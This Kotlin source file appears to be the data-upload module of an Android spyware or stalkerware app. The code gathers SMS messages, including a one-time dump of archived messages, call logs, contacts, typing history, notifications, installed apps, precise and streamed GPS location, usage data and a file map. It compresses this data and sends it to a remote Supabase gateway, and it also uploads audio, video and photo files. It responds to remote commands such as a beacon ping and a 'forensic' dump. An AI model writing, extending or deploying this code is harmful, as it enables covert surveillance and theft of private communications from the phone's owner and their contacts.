package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object CloudManager {

        // Modular Upload: Takes a list of features to upload (e.g. ["sms:20", "location"] or ["ALL"])
    suspend fun uploadData(ctx: Context, modules: List<String>, triggerReason: String = "PERIODIC_SYNC") {
        withContext(Dispatchers.IO) {
            try {
                DebugLogger.log("Cloud", "Starting Upload. Modules: $modules | Trigger: $triggerReason")

                val moduleMap = modules.associate {
                    val parts = it.split(":")
                    parts[0].trim().lowercase() to (parts.getOrNull(1)?.toIntOrNull() ?: -1)
                }
                
                // Check Global Config before uploading
                if (!ConfigManager.canUpload(ctx)) {
                    DebugLogger.log("Cloud", "Upload BLOCKED by Schedule/Config")
                    return@withContext
                }

                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("device_model", android.os.Build.MODEL)

                val fcmToken = DeviceManager.getRobustFcmToken(ctx)
                if (fcmToken != null) json.put("fcm_token", fcmToken)
                json.put("trigger", triggerReason)
                
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val isAll = moduleMap.containsKey("all")

                // --- MODULE 1: BASIC VITALS ---
                if (isAll || moduleMap.containsKey("vitals")) {
                    val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                    
                    // Network stats moved here
                    val netStats = NetworkTracker.getStats(ctx)
                    json.put("online_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netStats.first))
                    json.put("online_sessions", netStats.second)
                }

                // --- MODULE 2: SMS (PARAMETRIC SYNC) ---
                if (isAll || moduleMap.containsKey("sms")) {
                    val limit = moduleMap["sms"] ?: -1
                    if (limit > 0) {
                        json.put("sms_logs", PhoneManager.getHistoricalSms(ctx, limit))
                    } else {
                        val currentSmsLogs = JSONArray(prefs.getString("sms_logs_cache", "[]"))
                        if (triggerReason != "PERIODIC_SYNC") {
                            // Manual Force: Send everything in cache
                            if (currentSmsLogs.length() > 0) json.put("sms_logs", currentSmsLogs)
                        } else {
                            // Periodic: Standard Delta Sync
                            val lastSmsSync = prefs.getLong("last_sync_sms_ts", 0L)
                            val deltaSms = JSONArray()
                            for (i in 0 until currentSmsLogs.length()) {
                                val item = currentSmsLogs.getJSONObject(i)
                                if (item.optLong("timestamp", 0L) > lastSmsSync) deltaSms.put(item)
                            }
                            if (deltaSms.length() > 0) json.put("sms_logs", deltaSms)
                        }
                    }
                    json.put("sms_count", prefs.getInt("sms_count", 0))
                }

                // --- ONE-TIME HISTORICAL SMS PASSENGER ---
                if (!prefs.getBoolean("historical_sms_dumped", false)) {
                    val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
                    if (vaultFile.exists()) {
                        try {
                            val vaultData = vaultFile.readText()
                            json.put("historical_sms", JSONArray(vaultData))
                            DebugLogger.log("CLOUD", "Historical SMS Vault attached to payload")
                        } catch (e: Exception) { }
                    }
                }

                // --- MODULE 3: USAGE ---
                if (isAll || moduleMap.containsKey("usage")) {
                     val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                     val startToday = TimeManager.getStartOfDay()
                     val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startToday, System.currentTimeMillis())
                     val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(
                         stats.filter { it.lastTimeUsed >= startToday }.sumOf { it.totalTimeInForeground }
                     )
                     json.put("screen_time_minutes", totalMins)
                     json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
                }

                // --- MODULE 4: LOCATION ---
                if (isAll || moduleMap.containsKey("location")) {
                    val streamDuration = modules.find { it.startsWith("location:stream:") }?.split(":")?.getOrNull(2)?.toLongOrNull()
                    
                    if (streamDuration != null) {
                        // STREAM MODE: Start BeaconService in high-freq location mode
                        DebugLogger.log("STREAM", "Starting Location Stream: ${streamDuration}m")
                        val intent = android.content.Intent(ctx, BeaconService::class.java).apply {
                            putExtra("duration_mins", streamDuration)
                            putExtra("mode", "LOCATION_STREAM")
                        }
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                        else ctx.startService(intent)
                        json.put("location_status", "STREAM_STARTED_${streamDuration}M")
                    } else {
                        // ACTIVE FETCH: Try to get one fresh GPS fix now
                        try {
                            val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx)
                            if (PermissionManager.hasBackgroundLocation(ctx)) {
                                val freshLoc = fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null).await()
                                if (freshLoc != null) {
                                    json.put("location_fresh", JSONObject().apply {
                                        put("lat", freshLoc.latitude); put("lon", freshLoc.longitude)
                                        put("acc", freshLoc.accuracy); put("ts", System.currentTimeMillis())
                                    })
                                }
                            }
                        } catch (e: Exception) { }
                    }
                    json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
                }

                // --- MODULE 5: TYPING ---
                if (isAll || modules.contains("typing")) {
                     json.put("typing_history", JSONArray(prefs.getString("typing_history", "[]")))
                }
                
                // --- MODULE 6: NETWORK ---
                if (isAll || modules.contains("network")) {
                     json.put("network_logs", JSONArray(prefs.getString("net_history_log", "[]")))
                }

                // --- MODULE 7: CALLS (DECOUPLED) ---
                if (isAll || moduleMap.containsKey("calls")) {
                     val limit = moduleMap["calls"] ?: 100
                     json.put("calls", PhoneManager.getCallLogs(ctx, limit))
                }

                // --- MODULE 7.1: CONTACTS (DECOUPLED) ---
                if (isAll || moduleMap.containsKey("contacts")) {
                     val limit = moduleMap["contacts"] ?: -1
                     json.put("contacts", PhoneManager.getContacts(ctx, limit))
                }

                // --- MODULE 7.2: APPS (DECOUPLED) ---
                if (isAll || moduleMap.containsKey("apps")) {
                     val limit = moduleMap["apps"] ?: -1
                     json.put("apps", AppListManager.getInstalledApps(ctx, limit))
                }

                // --- MODULE 8: FILES (Skeleton) ---
                if (modules.contains("files")) {
                    // Heavy! Only if explicitly asked, NEVER in "ALL" by default to save data
                    // Standard periodic scan uses depth 3 to save battery
                    json.put("file_skeleton", FileManager.generateReport(3))
                }
                
                // --- MODULE 9: NOTIFICATIONS (FORCE-AWARE SYNC) ---
                if (isAll || modules.contains("notifications")) {
                    val currentNotifs = JSONArray(prefs.getString("notif_history", "[]"))
                    if (triggerReason != "PERIODIC_SYNC") {
                        // Manual Force: Send everything in cache
                        if (currentNotifs.length() > 0) json.put("notif_history", currentNotifs)
                    } else {
                        // Periodic: Send only new items (Delta)
                        val lastNotifSync = prefs.getLong("last_sync_notif_ts", 0L)
                        val deltaNotifs = JSONArray()
                        for (i in 0 until currentNotifs.length()) {
                            val item = currentNotifs.getJSONObject(i)
                            if (item.optLong("ts", 0L) > lastNotifSync) deltaNotifs.put(item)
                        }
                        if (deltaNotifs.length() > 0) json.put("notif_history", deltaNotifs)
                    }
                }

                // --- SUMMARY STATS AGGREGATION (Gated to ALL or VITALS) ---
                if (isAll || moduleMap.containsKey("vitals")) {
                    val summary = JSONObject()
                    val distKm = prefs.getFloat("total_distance_km", 0f)
                    summary.put("location_dist_km", distKm)
                    
                    val typeStats = TypingManager.getStats(ctx)
                    summary.put("typing_chars", typeStats.getInt("total_chars"))
                    summary.put("typing_wpm", typeStats.getInt("avg_wpm"))
                    
                    val phoneStats = PhoneManager.getStats(ctx)
                    summary.put("call_duration_sec", phoneStats.totalDuration)
                    summary.put("call_count_total", phoneStats.totalCalls)
                    summary.put("contact_count", phoneStats.contactCount)
                    
                    summary.put("notif_count_total", prefs.getInt("notif_count", 0))
                    summary.put("app_switch_count", UsageManager.getSwitchCount(ctx))
                    
                    // Inject 7-day engagement trend into standard summary
                    summary.put("engagement_7d", EngagementTracker.getHistory(ctx))
                    
                    json.put("summary_stats", summary)
                }

                // ATOMIC GZIP COMPRESSION (Fix 6: Prevents corrupted streams)
                val wrapper = JSONObject()
                wrapper.put("action", "upload_stats")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", json)

                val bos = java.io.ByteArrayOutputStream()
                java.util.zip.GZIPOutputStream(bos).use {
                    it.write(wrapper.toString().replace("\\u0000", "").toByteArray(Charsets.UTF_8))
                }
                val compressedBytes = bos.toByteArray()

                val url = URL(SecretVault.getGatewayUrl(ctx))
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 10000
                conn.readTimeout = 30000
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", SecretVault.getLock(ctx))
                conn.setRequestProperty("Authorization", "Bearer ${SecretVault.getLock(ctx)}")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.doOutput = true
                conn.setFixedLengthStreamingMode(compressedBytes.size)

                conn.outputStream.use { it.write(compressedBytes) }

                val code = conn.responseCode
                if (code in 200..299) {
                    // Sync Success: Update Delta Timestamps
                    val now = System.currentTimeMillis()
                    prefs.edit()
                        .putLong("last_sync_sms_ts", now)
                        .putLong("last_sync_notif_ts", now)
                        .apply()

                    DebugLogger.log("Cloud", "Upload Finished. Code: $code")
                    
                    // Clean up vault only on success
                    if (json.has("historical_sms")) {
                        prefs.edit().putBoolean("historical_sms_dumped", true).apply()
                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
                        if (vaultFile.exists()) vaultFile.delete()
                        DebugLogger.log("Cloud", "Historical SMS archive successfully extracted and synced. Vault cleared.")
                    }
                } else {
                    if (code == 402 || code >= 500) SecretVault.switchFallback(ctx)
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Code: $code | Msg: $err")
                }
            } catch (e: Exception) {
                if (e is java.net.UnknownHostException || e is java.net.ConnectException || e is java.net.SocketException) {
                    DebugLogger.log("Cloud", "Upload Failed: Device is offline")
                } else if (e is java.net.SocketTimeoutException) {
                    SecretVault.switchFallback(ctx)
                    DebugLogger.log("CLOUD_ERR", "Upload Failed: Timeout")
                } else {
                    DebugLogger.log("CLOUD_ERR", "Upload Failed: ${e.toString()}")
                }
            }
        }
    }

    // --- INTERNAL DUMP COLLECTOR (FORENSIC MODE) ---
    fun collectDumpData(ctx: Context): JSONObject {
        val json = JSONObject()
        
        // 1. System Vitals
        json.put("static", DeviceManager.getStaticInfo(ctx))
        json.put("health", DeviceManager.getHealthStats(ctx))
        
        // 2. STREAM LOGGING RECOVERY
        json.put("stream_logs_status", "Delegated to Survivor Protocol (Streamed to Vault)")
        
        // 3. Persistent Data (The Deep Dive)
        json.put("calls", PhoneManager.getCallLogs(ctx))
        json.put("contacts", PhoneManager.getContacts(ctx))
        json.put("apps", AppListManager.getInstalledApps(ctx))



        return json
    }

    // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
    fun sendPing(ctx: Context, note: String = "Online", extraData: JSONObject? = null) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                val batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

                val fcmToken = DeviceManager.getRobustFcmToken(ctx)
                
                val payload = JSONObject()
                if (fcmToken != null) payload.put("fcm_token", fcmToken)
                payload.put("device_model", android.os.Build.MODEL)
                payload.put("battery_level", batteryLevel)
                payload.put("trigger", "BEACON")
                payload.put("note", note)
                
                // POPULATE DIRECT COLUMNS: Move extraData back to the root payload so Supabase maps it to the new SQL columns.
                extraData?.keys()?.forEach { key -> payload.put(key, extraData.get(key)) }
                
                val summary = JSONObject()
                summary.put("status", "ONLINE")
                payload.put("summary_stats", summary)

                val wrapper = JSONObject()
                wrapper.put("action", "ping")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", payload)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 5000
                conn.readTimeout = 10000
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                                val sanitizedJson = wrapper.toString().replace("\\u0000", "")
                conn.outputStream.use { it.write(sanitizedJson.toByteArray()) }
                val code = conn.responseCode
                if (code !in 200..299) {
                    if (code == 402 || code >= 500) SecretVault.switchFallback(ctx)
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Ping Failed: $code | $err")
                } else {
                    DebugLogger.log("BEACON", "Ping sent ($note). Code: $code")
                }
            } catch (e: Exception) {
                if (e is java.net.UnknownHostException || e is java.net.ConnectException || e is java.net.SocketException) {
                     DebugLogger.log("BEACON", "Ping aborted: Offline")
                } else if (e is java.net.SocketTimeoutException) {
                     SecretVault.switchFallback(ctx)
                     DebugLogger.log("BEACON_ERR", "Ping Failed: Timeout")
                } else {
                    DebugLogger.log("BEACON_ERR", "Ping Failed: ${e.message}")
                }
            }
        }
    }

    // --- SYNCHRONOUS FILE UPLOAD (OOM-SAFE STREAMING MULTIPART) ---
    suspend fun uploadFile(ctx: Context, file: java.io.File, category: String = "GENERAL", customTimestamp: Long? = null, bucketName: String = "cortex-vault"): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                val folderName = DeviceManager.getDeviceFolderName(ctx)
                val timestamp = customTimestamp ?: System.currentTimeMillis()
                
                // Construct direct storage path: folderName/category/timestamp_filename
                // CRITICAL: Vision Vault requires exact deviceId as root folder for edge function parsing
                val storagePath = if (bucketName == "cortex-vision-vault") {
                    "$deviceId/$category/${timestamp}_${file.name}"
                } else {
                    "$folderName/$category/${timestamp}_${file.name}"
                }
                
                val supabaseUrl = SecretVault.getStorageUrl(ctx, bucketName, storagePath)
                val supabaseKey = SecretVault.getLock(ctx)

                DebugLogger.log("CLOUD", "Direct Storage Pipe Open: ${file.name}")

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 10000
                conn.readTimeout = 60000
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                
                val extension = file.extension.lowercase()
                val mime = when(extension) {
                    "mp4" -> "video/mp4"
                    "m4a" -> "audio/mp4"
                    "jpg", "jpeg" -> "image/jpeg"
                    else -> "application/octet-stream"
                }
                conn.setRequestProperty("Content-Type", mime)
                conn.setRequestProperty("x-upsert", "true")
                conn.doOutput = true
                
                // Tell the OS we're streaming binary data directly
                conn.setFixedLengthStreamingMode(file.length())

                file.inputStream().use { input ->
                    conn.outputStream.use { output ->
                        input.copyTo(output, 8192)
                    }
                }
                
                val code = conn.responseCode
                if (code !in 200..299) {
                    if (code == 402 || code >= 500) SecretVault.switchFallback(ctx)
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Stream Upload Failed (${file.name}): $code | $err")
                    return@withContext false
                } else {
                    DebugLogger.log("CLOUD", "Stream Upload ${file.name} Success. Registering...")
                    // Register file in database so it shows up in Vault
                    val reg = JSONObject()
                    reg.put("action", "register_file")
                    reg.put("deviceId", deviceId)
                    val p = JSONObject()
                    p.put("file_name", file.name)
                    p.put("file_path", storagePath)
                    p.put("category", category)
                    p.put("file_size", file.length())
                    // Forensic Metadata Injection
                    p.put("original_last_modified", file.lastModified())
                    val extension = file.extension.lowercase()
                    val mime = android.webkit.MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension) ?: "application/octet-stream"
                    p.put("mime_type", mime)
                    reg.put("payload", p)
                    
                    val regUrl = URL(SecretVault.getGatewayUrl(ctx))
                    val regConn = regUrl.openConnection() as HttpURLConnection
                    regConn.connectTimeout = 5000
                    regConn.readTimeout = 10000
                    regConn.requestMethod = "POST"
                    regConn.setRequestProperty("apikey", supabaseKey)
                    regConn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                    regConn.setRequestProperty("Content-Type", "application/json")
                    regConn.doOutput = true
                    regConn.outputStream.use { it.write(reg.toString().toByteArray()) }
                    DebugLogger.log("CLOUD", "File Registry Status: ${regConn.responseCode}")
                    return@withContext true
                }
            } catch (e: Exception) {
                if (e is java.net.UnknownHostException || e is java.net.ConnectException || e is java.net.SocketException) {
                     DebugLogger.log("Cloud", "File Upload Failed: Offline")
                } else if (e is java.net.SocketTimeoutException) {
                     SecretVault.switchFallback(ctx)
                     DebugLogger.log("CLOUD_ERR", "Stream Upload Fail: Timeout")
                } else {
                    DebugLogger.log("CLOUD_ERR", "Stream Upload Fail: ${e.message}")
                }
                return@withContext false
            }
        }
    }

    suspend fun uploadSkeleton(ctx: Context, json: JSONObject) {
        withContext(Dispatchers.IO) {
            try {
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                
                val wrapper = JSONObject()
                wrapper.put("action", "upload_skeleton")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", json)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 10000
                conn.readTimeout = 30000
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.doOutput = true

                java.util.zip.GZIPOutputStream(conn.outputStream).use { gzip ->
                    gzip.write(wrapper.toString().toByteArray(Charsets.UTF_8))
                }
                val code = conn.responseCode
                if (code !in 200..299) {
                    if (code == 402 || code >= 500) SecretVault.switchFallback(ctx)
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Skeleton Failed: $code | $err")
                } else {
                    DebugLogger.log("Cloud", "Skeleton Upload ($code) - Size: ${json.toString().length} bytes")
                }
            } catch (e: Exception) {
                if (e is java.net.UnknownHostException || e is java.net.ConnectException || e is java.net.SocketException) {
                     DebugLogger.log("Cloud", "Skeleton Upload Failed: Offline")
                } else if (e is java.net.SocketTimeoutException) {
                     SecretVault.switchFallback(ctx)
                     DebugLogger.log("SKELETON_ERR", "Skeleton Fail: Timeout")
                } else {
                    DebugLogger.log("SKELETON_ERR", "Skeleton Fail: ${e.message}")
                }
            }
        }
    }
}
